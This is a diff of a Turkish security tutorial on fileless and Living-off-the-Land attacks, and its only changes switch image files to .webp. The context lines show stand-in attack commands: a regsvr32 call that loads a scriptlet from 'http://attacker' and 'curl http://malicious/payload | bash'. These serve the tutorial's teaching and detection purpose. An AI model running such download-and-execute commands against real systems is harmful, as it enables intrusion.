@@ -10,7 +10,7 @@ Geleneksel antivirüs çözümleri zararlı dosyaları disk üzerinde tarayarak 
 
 **Living Off the Land (LOTL)** konsepti, saldırganların hedef sistemde zaten bulunan güvenilir araçları (PowerShell, WMI, certutil, bash) kötüye kullanarak ek araç indirmeden amaçlarına ulaşmasıdır. Bu bölümde dosyasız saldırı vektörleri, süreç enjeksiyonu, LOLBAS/GTFOBins katalogları ve Sysmon/SIEM tabanlı tespit stratejileri; **MITRE ATT&CK**, **NIST SP 800-53**, **CIS Controls v8** ve Türkiye mevzuatı çerçevesinde ele alınacaktır.
 
-![Dosyasız saldırı zinciri ve MITRE ATT&CK eşlemesi](./1_JdlstieQTgJwjRFNf9lplA.png)
+![Dosyasız saldırı zinciri ve MITRE ATT&CK eşlemesi](./1_JdlstieQTgJwjRFNf9lplA.webp)
 *Phishing → PowerShell cradle → in-memory payload → WMI persistence → lateral movement saldırı zinciri*
 
 ---
@@ -146,7 +146,7 @@ Standart DLL enjeksiyonu `LoadLibrary` ile diske yazılmış kütüphaneyi yükl
 
 **LOLBAS** (Living Off The Land Binaries and Scripts) projesi, Microsoft tarafından imzalanmış meşru binary'lerin saldırgan tarafından nasıl kötüye kullanılabileceğini kataloglar. Ana MITRE tekniği **T1218 (System Binary Proxy Execution)** ve alt teknikleridir.
 
-![LOLBins ile dosyasız saldırı vektörleri](./Using_lolbins_in_fileless_attacks.jpg)
+![LOLBins ile dosyasız saldırı vektörleri](./Using_lolbins_in_fileless_attacks.webp)
 *LOLBins kullanılarak gerçekleştirilen dosyasız saldırı akışı*
 
 | Binary | Kötüye Kullanım | ATT&CK ID | Örnek Komut |
@@ -170,7 +170,7 @@ regsvr32.exe /s /n /u /i:http://attacker/file.sct scrobj.dll
 
 **Remcos/NetSupport RAT kampanyası** (Ocak 2026, Malwarebytes): Baştan sona LOLBins kullanan eksiksiz saldırı zinciri belgelenmiştir.
 
-![LOLBins azaltma stratejileri](./lolbins_mitigation_malware_attacks.jpg)
+![LOLBins azaltma stratejileri](./lolbins_mitigation_malware_attacks.webp)
 *LOLBins saldırılarına karşı katmanlı azaltma kontrolleri*
 
 > [!TIP]
@@ -212,7 +212,7 @@ curl http://malicious/payload | bash
 
 Dosyasız ve LotL saldırılarının tespiti, dosya değil **davranış** ve **süreç soyağacı (process ancestry)** üzerine kuruludur.
 
-![Statik ve dinamik analiz ile dosyasız tehdit tespiti](./static-malware-analysis-vs-dynamic-malware-analysis-mc-slide1.png)
+![Statik ve dinamik analiz ile dosyasız tehdit tespiti](./static-malware-analysis-vs-dynamic-malware-analysis-mc-slide1.webp)
 *Dosyasız tehditlerde davranışsal analiz ve log korelasyonunun rolü*
 
 ### Sysmon Yapılandırması
